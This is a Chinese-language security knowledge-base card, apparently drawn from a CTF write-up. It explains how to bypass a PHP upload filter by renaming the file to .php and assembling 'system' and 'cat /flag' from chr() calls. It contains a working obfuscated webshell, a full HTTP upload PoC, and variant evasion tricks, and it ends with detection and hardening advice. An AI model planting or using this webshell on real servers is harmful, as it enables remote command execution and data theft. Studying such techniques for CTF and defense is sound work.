---
id: web-php-rce-upload-chr-ascii-webshell-waf-bypass
title: PHP 上传内容 WAF 绕过：chr() 拼接 system 与命令的 ASCII 马
type: scenario
domain: web
path: web/php/rce
technique: php-upload-chr-ascii-webshell-waf-bypass
tags:
- php
- file-upload
- waf-bypass
- webshell
- chr
- rce
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:27:12+08:00'
  notes: 已对照原文核对：only real revenge 中 JWT 爆破伪造 admin 后上传、后端文件类型不校验可改后缀、内容 WAF 用 chr() 逐字符拼 system 与 cat /flag、<?= 短标签执行均一致。未验证点：原文未给出最终 flag/回显截图，卡片已标 confidence=medium；无靶机，PoC 未复跑；原文未标注受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/php/rce/web-php-rce-upload-chr-ascii-webshell-waf-bypass/
draft: false
kb_aliases:
- ASCII 马
- chr 拼接 system
- 上传 WAF 绕过
- 后缀修改 getshell
- only real revenge
- JWT 爆破进后台上传
- chr(115) system
---

## 一句话结论

后台图片上传只校验“像图片”而不校验扩展名/内容时，可以抓包把文件名改成 `.php`；若内容 WAF 拦截 `system`、`cat`、`flag` 等字面量，可用 `chr()` 逐字符拼出 `system` 与 `cat /flag`，再用 `<?= ... ?>` 短标签执行，得到一个不含敏感关键字的 ASCII 马。

## 原理

- 上传接口通常只检查 `Content-Type`/文件头/图片尺寸，未对扩展名做白名单；攻击者把图片文件名改为 `shell.php` 或 `shell.phtml`，内容保持 PHP 代码，服务器按 PHP 解析。
- 内容 WAF 若只匹配 `system(`、`exec(`、`cat `、`flag` 等连续字符串，直接写 `system('cat /flag')` 会被拦截。
- PHP 的 `chr()` 可以把 ASCII 码转成字符，字符串拼接在运行时构造出函数名与命令：
  ```php
  $func = chr(115).chr(121).chr(115).chr(116).chr(101).chr(109); // system
  $cmd = '';
  foreach ([99,97,116,32,47,102,108,97,103] as $ascii) { $cmd .= chr($ascii); } // cat /flag
  @$func($cmd);
  ```
  请求内容中不出现 `system`、`cat`、`flag` 的连续字面量，WAF 匹配不到；PHP 运行时 `$func` 为 `system`，`$cmd` 为 `cat /flag`，动态函数调用执行命令。
- `<?=` 是 `<?php echo` 的短标签；如果目标 `short_open_tag` 开启，`<?= ... ?>` 可直接执行表达式/语句。也可以用 `<?php ... ?>` 包裹。
- 前置链：JWT 弱密钥爆破/伪造 admin token 进入后台（或其它管理员权限绕过），再利用上传点；上传成功后在浏览器/curl 访问 `shell.php`，命令输出回显。
- 根因是“上传只做表面类型检查 + 内容过滤只匹配字面量”；扩展名白名单、内容语义检测、Web 目录禁止执行 PHP 才能根治。

## 触发条件

- 上传接口允许把文件保存为 `.php`/`.phtml`/`.php5` 等可执行扩展名，或存在解析漏洞。
- 内容 WAF 只做关键字/正则字面量匹配，未做 PHP 词法/AST 检查，也未禁用 `chr`/动态函数调用。
- 目标 `system`/`exec` 等函数未被 `disable_functions` 禁用；`<?=` 短标签可用或可改用完整标签。
- 攻击者已获得上传权限（如 JWT 弱密钥伪造 admin、默认口令、越权）。
- 上传目录在 Web 根下且可访问。

## 利用步骤

1. 通过 JWT 弱密钥爆破/伪造或其他方式获得管理员权限，进入上传功能。
2. 上传一张正常图片，抓包观察文件名、Content-Type、保存路径与响应。
3. 修改文件名为 `shell.php`（或 `.phtml`/`.php5`），内容替换为 ASCII 马：
   ```php
   <?=
   $func=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
   $cmd='';
   foreach([99,97,116,32,47,102,108,97,103] as $a){$cmd.=chr($a);}
   @$func($cmd);
   ?>
   ```
4. 上传成功后访问 `http://target/upload/shell.php`，观察 `cat /flag` 输出。
5. 若被拦截，尝试拆分更多关键字（`chr`、`base64_decode`、字符串反转、`$_GET` 传参）、换扩展名、加图片头（GIF89a）绕过内容检测。
6. 若命令无回显，改为写文件/反弹 shell/HTTP 外带。

## PoC

```http
POST /upload HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/png

<?=
$func=chr(115).chr(121).chr(115).chr(116).chr(101).chr(109);
$cmd='';
foreach([99,97,116,32,47,102,108,97,103] as $a){$cmd.=chr($a);}
@$func($cmd);
?>
------x--
```

```http
GET /upload/shell.php HTTP/1.1
Host: target
```

响应为 `/flag` 内容。

## 变体与关联

- **函数构造变体**：`chr()`、`base64_decode()`、字符串反转、`str_rot13`、`('sys'.'tem')`、`$f='system'; $f(...)`、`call_user_func`。
- **命令构造变体**：`chr` 拼接、`$_GET`/`$_POST` 传参、`hex2bin`、`pack`、环境变量、`cat /f*` 通配。
- **上传变体**：`.php`、`.phtml`、`.php5`、`.phar`、`.htaccess`、图片头伪装、Content-Type 伪造、解析漏洞、竞争上传。
- **关联**：[[web-php-rce-pbootcms-iflabel-dynamic-function-waf-rasp-bypass]]（字符串拼接函数名绕过 WAF/RASP）；[[web-generic-file-upload-single-replace-dotdot-bypass]]（上传扩展名/路径绕过）；[[web-generic-jwt-weak-hmac-key-bruteforce]]（JWT 弱密钥爆破进后台的前置）。
- **边界**：上传扩展名白名单、Web 目录禁止执行 PHP、`disable_functions` 禁用命令函数、内容 WAF 做词法/AST 检测时，本路径失效。

## 检测与防御

- **检测**：上传文件名出现 `.php`/`.phtml`/`.php5`、内容含 `chr(`、`base64_decode`、`<?=`、动态函数调用；上传后访问新 PHP 文件并执行命令。
- **防御**：上传扩展名白名单 + 文件头/内容校验；上传目录移出 Web 根或禁止执行 PHP；`disable_functions` 禁用 `system`/`exec`/`shell_exec` 等。
- **加固**：WAF 做 PHP 词法/AST 检测而非字面量匹配；JWT 使用强随机密钥；上传接口加认证、限速与审计。
